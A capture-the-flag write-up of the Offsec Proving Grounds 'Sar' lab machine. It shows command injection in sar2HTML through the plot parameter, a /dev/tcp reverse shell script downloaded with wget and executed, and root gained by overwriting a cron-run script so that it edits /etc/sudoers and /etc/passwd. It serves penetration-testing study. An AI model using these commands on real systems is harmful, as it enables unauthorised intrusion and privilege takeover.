---
tags: cronjob, sar2HTML
---
## Offsec PG: Sar Writeup

***Overview***: *Sar is a Linux machine on Offensive Security Proving Grounds which is rated Easy, this machine exploits command injection to gain foothold and also exploits running cronjobs to gain root access.*

#### Enumeration
-  So I firstly go to the webpage and i see the default Ubuntu page being displayed
![](Sar_assets/Pasted%20image%2020220927204848.png)
- then i run a port scan on the target for open ports`nmap -sV -sC -p- -T4 192.168.70.35 `
![](Sar_assets/Pasted%20image%2020220927205456.png)
- i also run a directory scan on the target using FFUF `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.70.35/FUZZ`
![](Sar_assets/Pasted%20image%2020220927205439.png)
- navigating to the `robots.txt` directory, i'm presented with the directory sar2HTML
![](Sar_assets/Pasted%20image%2020220927210705.png)
- going to that directory, i discover the web application is running a software sar2HTML version 3.2.1
![](Sar_assets/Pasted%20image%2020220927210723.png)
- searching for an exploit for this software, we see that this application is vulnerable to remote code execution in exploitDB [https://www.exploit-db.com/exploits/47204](https://www.exploit-db.com/exploits/47204)
![](Sar_assets/Pasted%20image%2020220927211435.png)
- so going to the link `http://192.168.70.35/sar2HTML/index.php?plot=;id` in attempt of exploiting this, if we click on select host, we will see the output of the screenshot
![](Sar_assets/Pasted%20image%2020220927212259.png)
![](Sar_assets/Pasted%20image%2020220927212409.png)
- `http://192.168.70.35/sar2HTML/index.php?plot=;cat /home/local.txt` and get the flag as 4cc5606165bee87839fc25783d42d552
![](Sar_assets/Pasted%20image%2020220927213917.png)

#### Exploitation and Foothold
- so firstly i create a bash script named shell.sh on my attac k machine with the payload `sh -i >& /dev/tcp/192.168.49.105/9001 0>&1`
-  then exploiting the command injection i run`wget http://192.168.49.169/shell.sh` by http://192.168.105.35/sar2HTML/index.php?plot=;wget%20http://192.168.49.105/shell.sh
- I make the file executable using `chmod 777 shell.sh` by http://192.168.105.35/sar2HTML/index.php?plot=;chmod%20777%20shell.sh
- i spin up a netcat listener on my terminal using `nc -n -vv -l -p 9001` and then on the server, i run`./shell.sh` by http://192.168.105.35/sar2HTML/index.php?plot=;./shell.sh and load the page
- looking at the listener i get got a shell
![](Sar_assets/Pasted%20image%2020220928213828.png)
- then i spawn a more interactive shell using python 
![](Sar_assets/Pasted%20image%2020220928213941.png)
- looking at the home directory we can also view the first flag as well
![](Sar_assets/Pasted%20image%2020220928214038.png)

#### Privilege Escalation
- so i retrieve the linpeas.sh script from my machine to find privilege escalation vectors
![](Sar_assets/Pasted%20image%2020220928214400.png)
- then i discover some crontabs running and a file finally.sh being executed with sudo privileges, this particular script runs every 5 minutes
![](Sar_assets/Pasted%20image%2020220929091928.png)
![](Sar_assets/Pasted%20image%2020220928214617.png)
- I also discovered that it is vulnerable to CVE-2021-4034 which is a local privilege escalation vulnerability found in the polkit's pkexec utility
![](Sar_assets/Pasted%20image%2020220929090218.png)
- i view the contents of the script and see a script write.sh is being executed, viewing the permissions of both files, finally.sh is writable by us and it belongs to root, but write.sh is writable
![](Sar_assets/Pasted%20image%2020220929081944.png)
- so we will exploit this by appending to or overwriting the payload `echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers` to the write.sh script  
`echo 'echo www-data::0:0:root:/root:/bin/bash >> /etc/passwd' > write.sh`
- to do that I run  `echo 'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > write.sh` to add to the user to the sudoers files
![](Sar_assets/Pasted%20image%2020220930080552.png)
- then after then i run `sudo bash` and get root, we then obtain the flag int the root directory in a file proof.txt
![](Sar_assets/Pasted%20image%2020220930075749.png)
- by running `sudo -l` i can see that i have all the privileges
![](Sar_assets/Pasted%20image%2020220930080009.png)

![](Sar_assets/Pasted%20image%2020220929091633.png)

